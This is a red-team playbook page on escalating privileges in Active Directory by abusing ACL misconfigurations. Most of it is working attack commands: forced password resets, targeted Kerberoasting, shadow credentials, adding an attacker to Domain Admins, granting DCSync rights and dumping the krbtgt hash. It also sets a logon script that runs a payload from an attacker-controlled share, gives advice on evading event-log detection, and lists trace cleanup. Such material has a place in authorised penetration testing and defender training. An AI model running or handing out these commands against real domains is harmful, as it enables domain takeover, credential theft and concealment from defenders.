# ACL Abuse in Active Directory

> **MITRE ATT&CK**: Privilege Escalation > T1222.001 - File and Directory Permissions Modification: Windows File and Directory Permissions Modification
> **Platforms**: Windows / Active Directory
> **Required Privileges**: Domain User (with misconfigured ACLs)
> **OPSEC Risk**: Medium

## Strategic Overview

Active Directory Access Control Lists (ACLs) define which principals can perform actions on
AD objects. Misconfigurations -- often introduced by IT helpdesk delegation, application
service accounts, or legacy admin practices -- create invisible escalation paths. These
attacks are particularly valuable because they use legitimate AD modification operations
that blend with normal directory traffic. BloodHound has made ACL attack paths discoverable
at scale, turning what was once obscure into a primary attack vector. A Red Team Lead must
understand each ACL right, its abuse potential, and how to chain them into complete
escalation paths.

## Technical Deep-Dive

### Enumeration

```powershell
# PowerView - find interesting ACLs (can be slow in large domains)
Find-InterestingDomainAcl -ResolveGUIDs | Where-Object {$_.IdentityReferenceName -notmatch "Admin|Domain|Enterprise"}

# PowerView - check ACLs on specific object
Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match "WriteProperty|GenericAll|GenericWrite|WriteDacl|WriteOwner"}

# Check what rights a specific user has
Get-DomainObjectAcl -ResolveGUIDs | Where-Object {$_.SecurityIdentifier -eq (Get-DomainUser attacker).objectsid}

# BloodHound - collect and analyze ACL edges
.\SharpHound.exe -c ACL,ObjectProps
# Then query: MATCH p=shortestPath((u:User {name:'ATTACKER@DOMAIN.LOCAL'})-[*1..]->(g:Group {name:'DOMAIN ADMINS@DOMAIN.LOCAL'})) RETURN p
```

### GenericAll (Full Control)

Full control over an object allows any modification. Abuse depends on the object type.

```powershell
# GenericAll on USER - reset password
Set-DomainUserPassword -Identity target_user -AccountPassword (ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force) -Verbose

# GenericAll on USER - targeted Kerberoasting (set SPN, roast, remove)
Set-DomainObject -Identity target_user -Set @{serviceprincipalname='fake/YOURSPN'}
.\Rubeus.exe kerberoast /user:target_user /outfile:hash.txt
Set-DomainObject -Identity target_user -Clear serviceprincipalname

# GenericAll on USER - shadow credentials (if domain has ADCS)
.\Whisker.exe add /target:target_user /domain:domain.local /dc:DC01.domain.local

# GenericAll on GROUP - add member
Add-DomainGroupMember -Identity "Domain Admins" -Members attacker -Verbose
# Verify
Get-DomainGroupMember -Identity "Domain Admins" | Where-Object {$_.MemberName -eq "attacker"}

# GenericAll on COMPUTER - RBCD attack
# (see delegation-abuse.md for full RBCD chain)
Set-DomainObject -Identity TARGET$ -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
```

### GenericWrite

Allows writing to non-protected attributes on the object.

```powershell
# GenericWrite on USER - targeted Kerberoasting
Set-DomainObject -Identity target_user -Set @{serviceprincipalname='fake/YOURSPN'}

# GenericWrite on USER - shadow credentials
.\Whisker.exe add /target:target_user

# GenericWrite on COMPUTER - RBCD
# Set msDS-AllowedToActOnBehalfOfOtherIdentity (see delegation-abuse.md)

# GenericWrite on USER - logon script assignment
Set-DomainObject -Identity target_user -Set @{scriptpath='\\ATTACKER\share\payload.exe'}
```

### WriteOwner

Allows taking ownership of the object, which then permits modifying the DACL.

```powershell
# Step 1: Take ownership of the object
Set-DomainObjectOwner -Identity "Domain Admins" -OwnerIdentity attacker

# Step 2: Grant yourself full control via DACL modification
Add-DomainObjectAcl -TargetIdentity "Domain Admins" -PrincipalIdentity attacker -Rights All

# Step 3: Now exploit with GenericAll (e.g., add yourself to group)
Add-DomainGroupMember -Identity "Domain Admins" -Members attacker

# Impacket equivalent (from Linux)
owneredit.py -action write -new-owner attacker -target 'Domain Admins' domain.local/attacker:password
dacledit.py -action write -rights FullControl -principal attacker -target 'Domain Admins' domain.local/attacker:password
```

### WriteDACL

Directly modify the DACL (permissions) on an object without needing ownership first.

```powershell
# Grant yourself DCSync rights on the domain object
Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=local" -PrincipalIdentity attacker -Rights DCSync

# Verify DCSync rights were added
Get-DomainObjectAcl -Identity "DC=domain,DC=local" -ResolveGUIDs | Where-Object {$_.SecurityIdentifier -eq (Get-DomainUser attacker).objectsid}

# Execute DCSync
.\mimikatz.exe "lsadump::dcsync /domain:domain.local /user:krbtgt"

# Impacket from Linux
dacledit.py -action write -rights DCSync -principal attacker -target-dn 'DC=domain,DC=local' domain.local/attacker:password
secretsdump.py domain.local/attacker:password@DC01.domain.local -just-dc-user krbtgt
```

### ForceChangePassword

Reset a user's password without knowing the current password.

```powershell
# PowerView
Set-DomainUserPassword -Identity target_user -AccountPassword (ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force)

# net rpc from Linux
net rpc password target_user 'NewPass123!' -U 'domain.local/attacker%password' -S DC01.domain.local

# rpcclient
rpcclient -U 'attacker%password' DC01.domain.local -c "setuserinfo2 target_user 23 'NewPass123!'"
```

### AddMember

Add a principal to a group.

```powershell
# PowerView
Add-DomainGroupMember -Identity "Target Group" -Members attacker

# net rpc from Linux
net rpc group addmem "Target Group" attacker -U 'domain.local/attacker%password' -S DC01.domain.local
```

### ReadLAPSPassword

Read LAPS-managed local administrator passwords.

```powershell
# PowerView
Get-DomainComputer -Identity TARGET -Properties ms-Mcs-AdmPwd
# See laps-abuse.md for detailed LAPS exploitation
```

### ReadGMSAPassword

Read Group Managed Service Account passwords.

```powershell
# Enumerate gMSAs and who can read their passwords
Get-ADServiceAccount -Filter * -Properties PrincipalsAllowedToRetrieveManagedPassword

# Read gMSA password (requires membership in allowed group)
$gmsa = Get-ADServiceAccount -Identity svc_gmsa -Properties 'msDS-ManagedPassword'
$blob = $gmsa.'msDS-ManagedPassword'
$mp = ConvertFrom-ADManagedPasswordBlob $blob
$secpw = $mp.SecureCurrentPassword

# GMSAPasswordReader tool
.\GMSAPasswordReader.exe --accountname svc_gmsa

# From Linux with gMSADumper
python3 gMSADumper.py -u attacker -p password -d domain.local
```

## BloodHound ACL Edges Reference

| Edge | Meaning | Primary Abuse |
|------|---------|---------------|
| GenericAll | Full control | Password reset, SPN set, RBCD, group add |
| GenericWrite | Write non-protected attributes | SPN set, shadow credentials, RBCD |
| Owns | Object owner | Modify DACL -> escalate |
| WriteDacl | Modify permissions | Grant DCSync, GenericAll |
| WriteOwner | Change ownership | Take ownership -> modify DACL |
| ForceChangePassword | Reset password | Authenticate as target |
| AddMember | Add group member | Join privileged groups |
| AllExtendedRights | All extended rights | Password reset, LAPS read |
| ReadLAPSPassword | Read LAPS attribute | Local admin access |
| ReadGMSAPassword | Read gMSA password | Service account access |

## Detection & Evasion

| Indicator | Detection Source | Evasion |
|-----------|-----------------|---------|
| DACL modification on sensitive objects | Event 5136 (Directory Service Changes) | Revert DACL changes after exploitation |
| Password reset without old password | Event 4724 (password reset attempt) | Use shadow credentials instead |
| Group membership changes | Event 4728/4732 (member added) | Remove membership after lateral movement |
| Ownership changes on AD objects | Event 5136 | Restore original owner after exploitation |
| DCSync replication requests | Event 4662 with replication GUIDs | Use from compromised DA account if possible |

### Cleanup Procedures

```powershell
# Remove group membership
Remove-DomainGroupMember -Identity "Domain Admins" -Members attacker

# Remove DACL modifications
Remove-DomainObjectAcl -TargetIdentity "DC=domain,DC=local" -PrincipalIdentity attacker -Rights DCSync

# Clear SPN after targeted Kerberoasting
Set-DomainObject -Identity target_user -Clear serviceprincipalname

# Clear RBCD attribute
Set-DomainObject -Identity TARGET$ -Clear 'msds-allowedtoactonbehalfofotheridentity'
```

## Cross-References

- [Delegation Abuse](delegation-abuse.md) - RBCD attacks enabled by ACL abuse
- [Kerberos Attacks](kerberos-attacks.md) - targeted Kerberoasting via ACL write
- [Certificate Abuse](certificate-abuse.md) - ADCS template ACL misconfigurations
- [AD Privilege Escalation Overview](ad-privilege-escalation.md) - full AD attack map

## References

- https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html
- https://www.thehacker.recipes/ad/movement/dacl
- https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/acl-persistence-abuse
- https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces
- https://github.com/ShutdownRepo/The-Hacker-Recipes
